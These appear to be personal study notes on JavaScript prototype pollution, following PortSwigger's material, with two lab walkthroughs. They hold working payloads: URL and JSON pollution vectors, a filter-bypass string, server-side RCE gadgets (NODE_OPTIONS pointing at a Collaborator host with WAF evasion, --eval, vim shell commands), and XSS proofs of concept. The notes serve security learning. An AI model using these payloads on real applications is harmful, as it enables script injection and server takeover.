# Prototype Pollution Notes

[portswigger](https://portswigger.net/web-security/prototype-pollution)

## Methodology

Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers.

As with any property, you can access `__proto__` using either bracket or dot notation:

```
username.__proto__
username['__proto__']
```

You can even chain references to `__proto__` to work your way up the prototype chain:

```
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

### Vulns

Successful exploitation of prototype pollution requires the following key components:

- A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

Sources locations: 

- the URL via either the query or fragment string (hash) - `https://vulnerable-website.com/?__proto__[evilProperty]=payload`
- JSON based input
- web messages

### Prototype pollution via the URL 
At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following:
`targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default Object.prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key.

In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries. 

### Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. This provides another potential vector for prototype pollution. 

Example:

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key `__proto__`:

```
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

### Prototype pollution sinks

Just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks wihtin the target applicaiton.

### Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is: 

```
Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.

Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
```

### Client-side prototype pollution vulnerabilities

Testing can be done manually or with DOM Invader

You need to try different ways of adding an arbitrary property to Object.prototype until you find a source that works. Steps include:

- try to inject an arbtrary property via the query string, URL fragment and any JSON input for example: `vulnerable-website.com/?__proto__[foo]=bar`
- in your browser console, inspect `object.prototype` to see if you have successfully polluted it with your arbitrary property: `Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful`
- if the property was not added to the prototype, try using different techniques such as switching to dot notation rather than bracket notation, or vice versa: `vulnerable-website.com/?__proto__.foo=bar`
- Repeat this process for each potential source

Tip: If neither of these techniques is successful, you may still be able to pollute the prototype via its constructor. We'll cover how to do this in more detail later. 

### Finding client-side prototype pollution sources using DOM Invader

Use DOM Invader with it enabled in burps browser to test for prototype pollution sources as you browse, which can save you a considerable amount of time and effort

Check out [DOM invader docs](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)

make sure to turn on prototype pollution in the settings: 
![image](https://github.com/user-attachments/assets/0d84b79a-9b80-413b-b732-c05c063d75c9)

### Finding client-side prototype pollution gadgets manually

Once a source is identified that lets you add arbitrary properties to the global `object.prototype` the next step is to find a suitable gadget that you can use to craft an exploit
- look through the source code and identify any properties that are used by the application or any libraries that it imports
- in burp enable response interception: `Proxy > Options > Intercept server responses` and intercept the response containing the JavaScript that you want to test
- add a `debugger` statement at the start of the script, then forward any remaining requests and responses
- in burps browser, go to thepage on which the target script is loaded, the `debugger` statement pauses execution of the script
- while paused switch to the console and enter the following command with one of the properties that you think is a potential gadget, the property is added to the global `object.prototype` and the browser will log a stack trace to the console whenever it is accessed:

```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

- press the button to conitnue execution of the script and monitor the console, If a stack trace appears, this confirms that the property was accessed somewhere within the application
- expand the stack trace and use the provided link to jump to the line of code where the property is being read
- using the browsers debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`
- repeat this process for any properties you think are potential gadgets

### Finding client-side prototype pollution gadgets using DOM Invader

[link](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets)

- From the DOM view, click the Scan for gadgets button next to any prototype pollution source that DOM Invader has found. DOM Invader opens a new tab and starts scanning for suitable gadgets.
- In the same tab, open the DOM Invader tab in the DevTools panel. Once the scan is finished, the DOM view displays any sinks that DOM Invader was able to access via the identified gadgets. In the example below, a gadget property called html was passed to the innerHTML sink.

### Prototype pollution via the constructor

Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the constructor function that was used to create it. For example, you can create a new object either using literal syntax or by explicitly invoking the Object() constructor as follows:

```
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the Object() constructor via the built-in constructor property:

```
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

You can also access any object's prototype as follows:

```
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

As `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, this provides an alternative vector for prototype pollution. 

### Bypassing flawed key sanitization

For example, consider the following URL:
`vulnerable-website.com/?__pro__proto__to__.gadget=payload`

If the sanitization process just strips the string `__proto__` without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source:
`vulnerable-website.com/?__proto__.gadget=payload`

### Prototype pollution in external libraries

As we've touched on already, prototype pollution gadgets may occur in third-party libraries that are imported by the application. In this case, we strongly recommend using DOM Invader's prototype pollution features to identify sources and gadgets. Not only is this much quicker, it also ensures you won't miss vulnerabilities that would otherwise be extremely tricky to notice. 

### Server-side prototype pollution

[research](https://portswigger.net/research/server-side-prototype-pollution)

An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain. 

Note: This doesn't include built-in properties set by JavaScript's native constructors as these are non-enumerable by default.

This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well

`POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property as follows: 

```
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

If the website is vulnerable, your injected property would then appear in the updated object in the response: 

```
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

### Detecting server-side prototype pollution without polluted property reflection

Things to look for:
- status code override
- JSON spaces override
- Charset override

### Status code override


- Find a way to trigger an error response and take note of the default status code.
- Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
- Trigger the error response again and check whether you've successfully overridden the status code.

### JSON spaces override

The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain. 

If you've got access to any kind of JSON response, you can try polluting the prototype with your own json spaces property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability. 


Note: When attempting this technique in Burp, remember to switch to the message editor's Raw tab. Otherwise, you won't be able to see the indentation change as the default prettified view normalizes this.

### Charset override

Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object. This contains another gadget that you can use to probe for server-side prototype pollution.

Notice that the following code passes an options object into the `read()` function, which is used to read in the request body for parsing. One of these options, `encoding`, determines which character encoding to use. This is either derived from the request itself via the `getCharset(req)` function call, or it defaults to UTF-8. 

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source. 

- Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`

```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

- send the request, servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form
- try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:

```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

- repeat the first request, if you successfully polluted the prototype the UTF-7 string should now be decoded in the response

### Scanning for server-side prototype pollution sources

Extension Server-Side Prototype Pollution Scanner 

Steps to use:
- Install the Server-Side Prototype Pollution Scanner extension from the BApp Store
- explore the target website using burps browser to map as much of the content as possible
- in the http history tab filter the list to show only in scope items
- select all items in the list
- right click your selection and go to `Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution` then select one of the scanning techniques from the list
- when prompted modify the attack configuration if required, then click OK to launch the scan

Note: If you're unsure which scanning technique to use, you can also select Full scan to run a scan using all of the available techniques. However, this will involve sending significantly more requests.

### Bypassing input filters for server-side prototype pollution

websites often attempt to prevent or patch prototype pollution vulns by filtering suspicious keys like `__proto__`, to bypass an attacker can:

- Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see Bypassing flawed key sanitization.
- Access the prototype via the constructor property instead of __proto__. For more information, see Prototype pollution via the constructor

Node applications can also delete or disable __proto__ altogether using the command-line flags --disable-proto=delete or --disable-proto=throw respectively. However, this can also be bypassed by using the constructor technique. 

### Remote code execution via server-side prototype pollution

**Identifying a vulnerable request**

Some of Node's functions for creating new child processes accept an optional shell property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious NODE_OPTIONS property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created: 

```
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

Tip: The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames

**Remote code execution via child_process.fork()**

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using NODE_OPTIONS. Of particular interest is the --eval argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment: 

```
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition to fork(), the child_process module contains the execSync() method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server. 

**Remote code execution via child_process.execSync()**

Just like fork(), the execSync() method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an execArgv property, you can still inject system commands into a running child process by simultaneously polluting both the shell and input properties: 

- The input option is just a string that is passed to the child process's stdin stream and executed as a system command by execSync(). As there are other options for providing the command, such as simply passing it as an argument to the function, the input property itself may be left undefined.
- The shell option lets developers declare a specific shell in which they want the command to run. By default, execSync() uses the system's default shell to run commands, so this may also be left undefined. 

By polluting both of these properties, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing. Note that there are a few caveats to this: 

- The shell option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the -c argument, which most shells use to let you pass in a command as a string. However, setting the -c flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
- As the input property containing your payload is passed via stdin, the shell you choose must accept commands from stdin. 

Although they aren't really intended to be shells, the text editors Vim and ex reliably fulfill all of these criteria. If either of these happen to be installed on the server, this creates a potential vector for RCE: 

```
"shell":"vim",
"input":":! <command>\n"
```

## Labs walkthrough

### Client-side prototype pollution via browser APIs

Background:

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:
- Find a source that you can use to add arbitrary properties to the global Object.prototype.
- Identify a gadget property that allows you to execute arbitrary JavaScript.
- Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you. 
```

**Manual:**
**Find a prototype pollution source**
- In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: `/?__proto__[foo]=bar`
- open the browser devtools panel and go to the `console` tab
- enter `object.prototype`
- study the properties of the returned object and observe that your injected `foo` property has been added, you've successfully found a prototype source

**Identify a gadget**
- in the browser devtools panel go to the sources tab
- study the javascript files that are loaded by the target site and look for any DOM XSS sinks
- in `searchLoggerConfigurable.js` notice that if the config object has a `transport_url` property this is used to dynamically append a script to the DOM
- observe that a `transport_url` property is defined for the `config` object, so this doesn't appear vulnerable
- observe that the next line uses the `object.definedProperty()` method to make the `transport_url` unwritable and unconfigurable, however notice that it doesn't define a `value` property

**Craft an exploit**
- using the prototype pollution source you identified ealier, try injecting an arbitrary value property: `/?__proto__[value]=foo`
- in the browser devtools panel, go to the elements tab and study the HTML content of the page, observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`
- modify the payload in the URL to inject an XSS poc like: `/?__proto__[value]=data:,alert(1);`
- observe that the `alert(1)` is called and the lab is solved

**DOM Invader solution:**

- load the lab in burps built in browser
- enable dom invader and enable the prototype pollution option
- open the browser devtools panel, go to the DOM Invader tab then reload the page
- observe DOM invader found two prototype pollution vectors in the search property
- click `scan for gadgets` a new tab opens in which dom invader begins scanning for gadgets using the selected source
- when the scan is complete open the devtools panel in the same tab as the scan, then go to the `DOM Invader` tab
- observe that DOM Invader has successfully accessed the `script.src` sink via the `value` gadget
- click `exploit` and dom invader automatically generates a proof of concept exploit and calls `alert(1)`

### DOM XSS via client-side prototype pollution

Background:

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

- Find a source that you can use to add arbitrary properties to the global Object.prototype.
- Identify a gadget property that allows you to execute arbitrary JavaScript.
- Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you. 
```

**Manual solution:**
**Find a prototype pollution source**
- in your browser try polluting `Object.prototype` by injecting an arbitrary property via the query string: `/?__proto__[foo]=bar`
- open the browser devtools panel and go to the `console` tab
- enter `object.prototype`
- study the properties of the returned object, observe that it now has a `foo` property with the value `bar`

**Identify a gadget**
- in devtools panel go to the sources tab
- study the javascript files that are loaded by the target site and look for any DOM XSS sinks
- in `searchLogger.js` notice that if the `config` object has a `transport_url` property this is used to dynamically append a script to the DOM
- notice that no `transport_url` property is defined for the `config` object, this is a potential gadget for controlling the `src` of the `<script>` element

**Crafting and exploit**
- Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property: `/?__proto__[transport_url]=foo`
- in the browser devtools panel, go to the elements tab and study the HTML content of the page, observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`
- modify the payload in the URL to inject an XSS poc like: `/?__proto__[transport_url]=data:,alert(1);`
- observe the javascript triggers and completes the lab

**DOM invader solution**

- load the lab in burps built in browser
- enable dom invader and enable the prototype pollution option
- open the browser devtools panel, go to the DOM Invader tab then reload the page
- observe DOM invader found two prototype pollution vectors in the search property
- click `scan for gadgets` a new tab opens in which dom invader begins scanning for gadgets using the selected source
- when the scan is complete open the devtools panel in the same tab as the scan, then go to the `DOM Invader` tab
- observe that DOM Invader has successfully accessed the `script.src` sink via the `transport_url` gadget
- click `exploit` and dom invader automatically generates a proof of concept exploit and calls `alert(1)`






























